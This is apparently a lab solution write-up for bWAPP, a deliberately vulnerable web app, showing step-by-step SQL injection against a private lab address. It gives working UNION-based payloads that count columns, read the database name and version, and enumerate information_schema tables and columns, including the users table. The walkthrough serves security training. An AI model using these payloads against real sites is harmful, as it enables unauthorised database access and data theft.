# bWAPP-Solutions
bWAPP - SQL Injection

We added `'` character to the id in the url to see what kind of output we will get.

`172.16.112.128/bWAPP/sqli_2.php?movie=1'&action=go`

The output depends on the script's quality. If script filters input then no SQL error would be returned. Page will load normally or give a warning like “Attack Spotted, Your IP Address has been recorded” or something similar.  However we have got error like this: 

```
Error: You have an error in your SQL syntax; check the manual that corresponds to your 
MySQL server version for the right syntax to use near ''' at line 1
```

Now we know that there is no any filter. Since we got an error, we are sure that this is SQL injectable and we can try to get some hidden data information from database.
 
##### SQL Injection (Select/GET)

###### Find Column Number of the SQL statement

There are two ways to find number of columns.

1.Using Order by

Order by  statement tell the database how to order the result. For example, the command below will order all the result by ascending order. Also we can change asc to desc.

Select name,age from user Where id=1 Order by user asc

It doesn't matter if column integer or string. Server will automatically order it by checking column type. Order by also can have number instead of column in select statement.  Using this method we can check how many column numbers in table.

`http://172.16.112.128/bWAPP/sqli_2.php?movie=1 order by 1-- &action=go` and we didn't get error until we enter column number 8.That means we have 7 column in our  movies table.

We put `--` comment character to end of SQL command to get rid of leftover strays. 

2.Using Union

Using union select or union all select statements we can see which columns are outputted to the site. Then we can use to retrieve and output our data. Using union all select can prevent type mismatch and get around queries that use the keyword DISTINCT. Note that, we can also get number of columns by adding numbers to the union statement until page will be displayed normally.

`http://172.16.112.128/bWAPP/sqli_2.php?movie=1 and 1=0 union all select 1,2,3,4,5,6,7--&action=go`

with “and 1=0” because only want to get data from union all statement. If we just wrote union statement without “and 1=0” then first select would overwrite second one.

Now we know that we can retrieve stolen data using 2,3,5,4 columns and we'll get database name and version using these columns.

###### Find Name of the Current Database

Adding database() to second column we can retrieve database name in the title section.

`http://172.16.112.128/bWAPP/sqli_2.php?movie=1 and 1=0 union all select 1,database(),3,4,5,6,7--&action=go`

###### Find Version of the Database

Adding version() or @@version to second column we can retrieve database version in the title section.

`http://172.16.112.128/bWAPP/sqli_2.php?movie=1 and 1=0 union all select 1,version(),3,4,5,6,7--&action=go`

or 
```
http://172.16.112.128/bWAPP/sqli_2.php?movie=1 and 1=0 union all select 1,version(),@@version,4,5,6,7--&action=go` 
```

##### SQL Injection (Search/POST)

###### List Table Names and Number of Records in Each Table of the Database.

All the table names and column names holds in Information_Schema database. To get tables, we would use information_schema like this:

Select table_name from information_schema.tables 

Using this query we can get all of the table names from database. Also column names by changing tables to columns. This only avaliable in version 5 and up. We find out version of the database adding version() to union statement. 

If we type “ma” to the search field we can see that query is something like “Select name From table Where name like '%ma%'. Server looking for value in the table containing “ma” pattern and can have text before and after it.  It could be amazing, Spider-Man or just Man.  We also can know what kind of input program expects from sqli_6.php

Using this SQL query we can get all of table schema and names from information_schema.tables.

```
' and 1 = 0 union all select 1,table_schema,table_name,4,5,6,7 from information_schema.tables where 1=0 or 1=1-- '
```

There were a lot of database name and table names. The reason is that we added 1=1 to end of query and that means bring all of the database and table names to us. There are more elegant ways to get table names of the database. For example,
```
' and 1=0 union all select 1,table_schema,table_name,4,table_rows,6,7 from information_schema.tables where table_schema = 'bwapp'-- '
```

table_schema was written to title which corresponds column 2, table_name was written to release which corresponds to column 3 and table_rows (records) was written to character which corresponds to column 5.

###### List Column Names of Each Table

We can retrieve column names by writing column names to information_schema instead of table names.  For example, 

Select column_name from information_schema.columns

Let's enter each table name to query to get columns names of table.

1. Blog Table
```
' and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'blog' and table_schema = 'bwapp'-- '
```

2. Heroes Table
```
' and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'heroes' and table_schema = 'bwapp'-- '
```

3. Movies Table
```
' and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'movies' and table_schema = 'bwapp'-- '
```

4. Users Table
```
' and 1=0 union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name = 'users' and table_schema = 'bwapp'-- '
```







